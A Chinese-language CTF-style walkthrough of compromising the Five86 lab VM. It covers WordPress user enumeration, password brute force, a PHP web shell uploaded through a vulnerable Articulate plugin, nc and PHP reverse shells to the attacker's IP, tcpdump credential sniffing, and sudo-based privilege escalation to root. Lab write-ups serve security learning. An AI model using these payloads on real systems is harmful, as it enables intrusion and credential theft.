@@ -1,0 +1,181 @@
+
+# 0x00环境
+攻击机：kali（192.168.1.28）<br />靶机：Five86-1（192.168.1.23）
+
+
+# 0x01实战
+
+## 端口扫描
+```
+nmap -sV -A -p- 192.168.1.23
+```
+![](https://img-blog.csdnimg.cn/4271701875c745b3bdfa80ed76cced5a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=Y26Ds&originHeight=692&originWidth=1280&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
+
+可以看到开放了21和80端口
+
+
+## 目录扫描
+![](https://img-blog.csdnimg.cn/01e3eec6f2fa47698f11551191c7fcac.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=Hcdtv&originHeight=441&originWidth=1136&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
+
+访问80端口http服务发现是使用wordpress搭建站点<br />![](https://img-blog.csdnimg.cn/b2a6fd304ea446d6b6d4d6e11d0d99f5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=kPUM0&originHeight=590&originWidth=963&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
+
+
+## 漏洞发现
+使用wpscan扫描，扫描出来了几个用户名
+```
+wpscan --url http://five86-2/ -e u
+```
+![](https://img-blog.csdnimg.cn/0de70789b52b45cca0c537e9c74226ea.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=d51sb&originHeight=710&originWidth=1309&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
+
+将扫描出来的用户名保存到username.txt中，把kali中的rockyou.txt.gz字典的k01内容提取出来作为密码字典进行爆破
+```
+wpscan --url http://five86-2/ -U username.txt -P /usr/share/wordlists/rockyou.txt
+```
+
+大约扫描了0.12%左右，差不多12分钟，扫出两个密码<br />![](https://img-blog.csdnimg.cn/8bf8da81883547f8bd7a56b1876fb9f0.png#crop=0&crop=0&crop=1&crop=1&id=Lyy2n&originHeight=169&originWidth=1797&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
+
+尝试登录后台，使用barney账户成功登录后台<br />![](https://img-blog.csdnimg.cn/f768ffbebfac4294ae0e69adeac5a81f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=l1nnS&originHeight=477&originWidth=1120&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
+
+在浏览后台过程中发现使用了`Insert or Embed Articulate Content into WordPress Trial`插件<br />![](https://img-blog.csdnimg.cn/2ec7c1d7274c496c913e97a1d8752be0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=GaxkJ&originHeight=417&originWidth=1150&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
+
+在https://www.exploit-db.com上找到利用文档https://www.exploit-db.com/exploits/46981
+
+
+## 漏洞利用
+创建一个包含index.html、index.php两个文件的 .zip压缩包
+```
+index.html内容为：<html>hello</html>
+index.php内容为：<?php echo system($_GET['cmd']); ?>
+```
+![](https://img-blog.csdnimg.cn/f8326916843849fa93f2ba3bfc098aa1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=etLNQ&originHeight=359&originWidth=1269&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
+
+```
+zip poc.zip index.html index.php
+```
+![](https://img-blog.csdnimg.cn/6bae6e183dd84c2f888df3328efa10e9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=VEwtj&originHeight=241&originWidth=1364&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
+
+登录后台新建一篇帖子<br />![](https://img-blog.csdnimg.cn/984bc54744ec4e8c8e84a2171aab925c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=Uxoiy&originHeight=830&originWidth=888&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
+
+选择上传创建的zip文件<br />![](https://img-blog.csdnimg.cn/eb5837a0685e41a2afbbeb8dedf20ce6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=ygOY7&originHeight=303&originWidth=1024&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
+![](https://img-blog.csdnimg.cn/67406b8a13e043d3ba8c9e9d551ed668.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=SOHht&originHeight=759&originWidth=918&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
+
+在浏览器访问
+```
+http://five86-2/wp-content/uploads/articulate_uploads/poc/index.php?cmd=whoami
+```
+![](https://img-blog.csdnimg.cn/162dab04cd8541ee8715c5678cdfa3a1.png#crop=0&crop=0&crop=1&crop=1&id=gLCiA&originHeight=129&originWidth=982&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
+
+使用nc反弹shell，创建监听
+```
+nc -vnlp 4444
+```
+![](https://img-blog.csdnimg.cn/70fe6ea9913e4c4d88ed3d5e7e468caa.png#crop=0&crop=0&crop=1&crop=1&id=Vo9p3&originHeight=120&originWidth=373&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
+
+在浏览器执行
+```
+http://five86-2/wp-content/uploads/articulate_uploads/poc/index.php?cmd=nc%20192.168.1.28%204444%20-e%20/bin/bash
+```
+
+![](https://img-blog.csdnimg.cn/56e40f563fc643cba541d593c11b290f.png#crop=0&crop=0&crop=1&crop=1&id=GNB74&originHeight=81&originWidth=1188&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
+失败
+
+重构反弹命令
+```
+http://five86-2/wp-content/uploads/articulate_uploads/poc/index.php?cmd=php%20-r%20%27$sock=fsockopen(%22192.168.1.28%22,4444);$proc=proc_open(%22/bin/sh%20-i%22,%20array(0=%3E$sock,%201=%3E$sock,%202=%3E$sock),$pipes);%27
+```
+
+成功反弹<br />![](https://img-blog.csdnimg.cn/d26aa1a2c1454f4c98dec2402a3eca4d.png#crop=0&crop=0&crop=1&crop=1&id=I0lbM&originHeight=163&originWidth=798&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
+
+
+## 提权
+查看系统内核
+```
+cat /proc/version
+cat /etc/issue
+```
+
+![](https://img-blog.csdnimg.cn/8a19c952ded241d29cfd3b58f03d692b.png#crop=0&crop=0&crop=1&crop=1&id=N9N9A&originHeight=128&originWidth=1407&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
+
+查找漏洞，对提权没有什么帮助<br />![](https://img-blog.csdnimg.cn/dd6602d26bb44c5a8a1c44c2c5f542a0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=ZLYYR&originHeight=250&originWidth=1462&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
+
+在home目录下发现了stephen账户，而我们在前面爆破出Stephen的密码<br />![](https://img-blog.csdnimg.cn/7de2106f443b486fa5d29730b1a1cb06.png#crop=0&crop=0&crop=1&crop=1&id=jOEiF&originHeight=272&originWidth=224&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
+
+使用stephen账户登录
+```
+su stephen
+```
+
+![](https://img-blog.csdnimg.cn/612099cffa524b45a038fa174a928430.png#crop=0&crop=0&crop=1&crop=1&id=IEbDG&originHeight=187&originWidth=868&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
+
+可以看到用户stephen在pcap组中，我就想着看看能不能找到一些pcap包或者抓一些数据包看看
+```
+getcap -r / 2>/dev/null
+```
+
+![](https://img-blog.csdnimg.cn/3eb8efc1fb7040c0ad3982074b5e17f6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=HYlHX&originHeight=292&originWidth=1357&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
+
+输入tcpdump -D来查看查看可以用来抓包的接口
+```
+tcpdump -D
+```
+
+![](https://img-blog.csdnimg.cn/74de314f5ecb453c97dff392a6ee1e48.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=WBqlq&originHeight=263&originWidth=866&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
+
+一个个的来看，在veth7c42377中找到敏感信息
+```
+timeout 120 tcpdump -w 1.pcap -i veth7c42377
+timeout 120是指2分钟
+-w是将结果输出到文件
+-i是指定监听端口
+```
+
+![](https://img-blog.csdnimg.cn/b43ff3a50e614a91bcc9d619a8bfafed.png#crop=0&crop=0&crop=1&crop=1&id=xrXu9&originHeight=189&originWidth=1116&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
+
+查看抓取到的数据包
+```
+tcpdump -r 1.pcap
+-r是从给定的流量包读取数据
+```
+
+![](https://img-blog.csdnimg.cn/be36097c087a40c9a6b4ee58feefb226.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=Txhs0&originHeight=794&originWidth=1019&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
+得到了用户名paul和密码 esomepasswford
+
+登录用户paul<br />![](https://img-blog.csdnimg.cn/5e33feae312d43b58f658096260eac63.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=ECRUz&originHeight=207&originWidth=801&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
+
+查看权限
+```
+sudo -l
+```
+
+![](https://img-blog.csdnimg.cn/63cb236755c9418c997c8a4f02a23c37.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=JbPGE&originHeight=238&originWidth=1177&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
+
+看到可以无密码使用peter的service命令，也就是说可以直接执行peter的/bin/bash
+```
+sudo -u peter service ../../../../../../bin/bash
+```
+
+![](https://img-blog.csdnimg.cn/d764dc9b3d054779970a9c87fe347a41.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=O9URE&originHeight=319&originWidth=1500&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
+
+查看peter用户的权限
+```
+sudo -l
+```
+![](https://img-blog.csdnimg.cn/3c1a8ee1f22348e7b9369cc80caeca4f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=qCcVc&originHeight=270&originWidth=1176&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
+
+可以以root身份无密码运行passwd命令
+
+使用passwd命令修改root的密码
+```
+sudo passwd root
+```
+![](https://img-blog.csdnimg.cn/23fb607c22874141b75f22f3ae9bc50a.png#crop=0&crop=0&crop=1&crop=1&id=bWnzM&originHeight=187&originWidth=709&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
+
+登录root账户
+```
+su root
+```
+![](https://img-blog.csdnimg.cn/b0ed59099ed84116ac16856bd9722d8b.png#crop=0&crop=0&crop=1&crop=1&id=E1F4q&originHeight=183&originWidth=659&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
+
+
+## final-flag
+在root根目录下找到flag<br />![](https://img-blog.csdnimg.cn/469e431546eb45808b64e321f49dfa4d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=RyDZQ&originHeight=562&originWidth=1187&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
